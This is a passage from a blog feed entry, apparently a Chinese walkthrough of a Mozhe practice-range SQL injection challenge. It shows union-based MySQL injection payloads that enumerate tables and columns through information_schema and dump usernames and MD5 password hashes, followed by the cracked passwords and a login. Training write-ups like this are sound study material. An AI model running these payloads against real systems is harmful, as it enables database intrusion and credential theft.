information_schema.tables where table_schema=&#39;mozhe_discuz_stormgroup&#39; -- q</code><br>获得表名notice,stormgroup_member<br><img src="https://img-blog.csdnimg.cn/8f85e4c2d2fc44759c55f4fbc057d92f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>⑧查询stormgroup_member表中字段名<br><code>id=aaa&#39; union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name=&#39;stormgroup_member&#39; -- q</code><br>获得字段名id,name,password,status<br><img src="https://img-blog.csdnimg.cn/afcb4a431bb34334868b3efe12c56152.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>⑨查询字段值<br><code>id=aaa&#39; union select 1,2,group_concat(name,0x7c,password),4 from stormgroup_member -- q</code><br>获取用户名和MD5加密的password<br>mozhe|356f589a7df439f6f744ff19bb8092c0,mozhe|57673e9e6b26829ba7a4b4d43e8ae8a7<br>somd5解密得到两个密码dsan13，891185，后面一个是对的，离谱。。。<br>登录获取key。<br><img src="https://img-blog.csdnimg.cn/091c2968f320486c9fa7df8a0ef6846f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;靶场地址：&lt;a href=&quot;https://www.mozhe.cn/bug/detail/dE1HSW5yYThxUHcyUTZab2pTcmpGUT09bW96aGUmozhe&quot;&gt;https://www.mozhe.cn/bug/detail/dE1HSW5yYThxU</summary>
      
    
    
    
    <category term="web漏洞" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="sql注入" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="mysql注入" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="靶场" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="mysql注入" scheme="https://redredredfish.github.io/tags/mysql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="联合注入" scheme="https://redredredfish.github.io/tags/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
    
    <category term="靶场" scheme="https://redredredfish.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
</feed>
